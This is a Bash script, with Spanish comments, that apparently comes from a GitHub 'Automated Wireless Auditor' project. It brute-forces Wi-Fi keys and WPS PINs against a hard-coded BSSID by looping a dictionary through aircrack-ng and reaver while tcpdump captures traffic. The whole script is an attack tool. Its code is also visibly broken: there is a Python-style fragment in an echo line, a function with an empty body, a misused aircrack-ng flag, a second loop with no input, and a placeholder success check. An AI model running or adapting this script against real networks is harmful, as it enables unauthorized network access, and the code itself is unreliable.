#!/bin/bash

# Definir códigos de color ANSI
verde='\033[0;32m'
reset_color='\033[0m'

# Banner ASCII 
function print_banner() {
    echo -e "${verde}  .;'                     \`;,    "
    echo -e " .;'  ,;'             \`;,  \`;,  ${reset_color}s3" % Configuration.version
    echo -e ".;'  ,;'  ,;'     \`;,  \`;,  \`;,  "
    echo -e "::   ::   :   ( )   :   ::   ::  ${reset_color}Automated Wireless Auditor"
    echo -e "':.  ':.  ':. /_\\ ,:'  ,:'  ,:'  "
    echo -e " ':.  ':.    /___\\   ,:'  ,:'   ${verde}https://github.com/Juandavidart/s3_alpha${reset_color}"
    echo -e "  ':.       /_____\\     ,:'     "
    echo -e "           /       \\         ${reset_color}"
}

# Verificar si se ejecuta como root
if [[ $EUID -ne 0 ]]; then
    echo -e "${verde}Error:${reset_color} Por favor, ejecuta el script con privilegios de superusuario (sudo)."
    exit 1
fi

# Verificar dependencias e instrucciones de instalación
check_dependency() {
    if ! command -v "$1" &> /dev/null; then
        echo -e "${verde}Error:${reset_color} $1 no está instalado. Puedes instalarlo usando:"
        echo -e "${verde}sudo apt-get update && sudo apt-get install $1${reset_color}"
        exit 1
    fi
}

check_dependency "aircrack-ng"
check_dependency "reaver"
check_dependency "tcpdump"

# Detectar la interfaz de red automáticamente
interface=$(iw dev 2>&1 | awk '$1=="Interface"{print $2}')
if [ -z "$interface" ]; then
    echo -e "${verde}Error:${reset_color} No se encontró una interfaz de red compatible. Asegúrate de tener una tarjeta de red instalada y correctamente configurada."
    exit 1
fi

# Funciones
single_connection_aircrack() {
    local bssid=$1
    local pin=$2
    # Agrega aquí la lógica para probar la clave contra el BSSID dado usando aircrack-ng
    aircrack-ng -a 2 -b "$bssid" -p "$pin" handshake*.cap  # Ajusta según tu configuración
}

single_connection_reaver() {
    local bssid=$1
    local pin=$2
    # Agrega aquí la lógica para probar la clave contra el BSSID dado usando reaver
    reaver -i "$interface" -b "$bssid" -p "$pin"  # Ajusta según tu configuración
}

clave_encontrada() {
    # Lógica para determinar si la clave fue encontrada
    # Agrega aquí la lógica basada en la salida de aircrack-ng, reaver u otro método
    # Ejemplo: revisar la existencia de un archivo que indica éxito
    if [ -e "clave_encontrada.txt" ]; then
        return 0  # Clave encontrada
    else
        return 1  # Clave no encontrada
    fi
}

prompt_pin() {
    # Lógica de prompt_pin
    # Agrega aquí la lógica para obtener el siguiente PIN
}

# Parámetros
bssid=${BSSID:-"00:90:4C:C1:AC:21"}
dictionary=${DICTIONARY:-"/path/to/dictionary.txt"}
delay=${DELAY:-0.001}  # 1 milisegundo

# Instrucciones de uso y comandos de instalación
echo -e "Este script realiza un ataque de fuerza bruta utilizando ${verde}aircrack-ng${reset_color} o ${verde}reaver${reset_color} para probar claves contra un BSSID específico."
echo "Asegúrate de tener instalados ${verde}aircrack-ng${reset_color}, ${verde}reaver${reset_color}, y ${verde}tcpdump${reset_color}, y ejecuta el script con sudo."
echo -e "Para instalar ${verde}aircrack-ng${reset_color}, ${verde}reaver${reset_color}, y ${verde}tcpdump${reset_color}, puedes usar los siguientes comandos:"
echo -e "${verde}sudo apt-get update"
echo -e "sudo apt-get install aircrack-ng reaver tcpdump${reset_color}"
echo ""
echo -e "Además, asegúrate de tener una tarjeta de red compatible instalada, e.g., ${verde}$interface${reset_color}."
echo -e "Puedes verificar las interfaces de red disponibles usando ${verde}'iw dev'${reset_color}."

# Ejecutar tcpdump para capturar el tráfico antes de los intentos de fuerza bruta
tcpdump -i "$interface" -w captura_antes.pcap &

# Ejecutar ataque de fuerza bruta con aircrack-ng
while read -r pin || [[ -n $pin ]]; do
    echo -e "[*] Trying PIN with aircrack-ng: $pin"
    single_connection_aircrack "$bssid" "$pin"
    sleep "$delay"

    # Verificar si se encontró la clave
    if clave_encontrada; then
        echo -e "${verde}[+] Clave encontrada: $pin${reset_color}"
        pkill -f "tcpdump"  # Detener la captura de tráfico
        exit 0
    fi
done < "$dictionary"

# Ejecutar tcpdump para capturar el tráfico después de los intentos de fuerza bruta
tcpdump -i "$interface" -w captura_despues.pcap &

# Ejecutar ataque de fuerza bruta con reaver
while read -r pin || [[ -n $pin ]]; do
    echo -e "[*] Trying PIN with reaver: $pin"
    single_connection_reaver "$bssid" "$pin"
    sleep "$delay"

    # Verificar si se encontró la clave
    if clave_encontrada; then
        echo -e "${verde}[+] Clave encontrada: $pin${reset_color}"
        pkill -f "tcpdump"  # Detener la captura de tráfico
        exit 0
    fi
done

# Detener la captura de tráfico si no se encontró la clave
pkill -f "tcpdump"
echo -e "${verde}[-] Clave no encontrada${reset_color}"
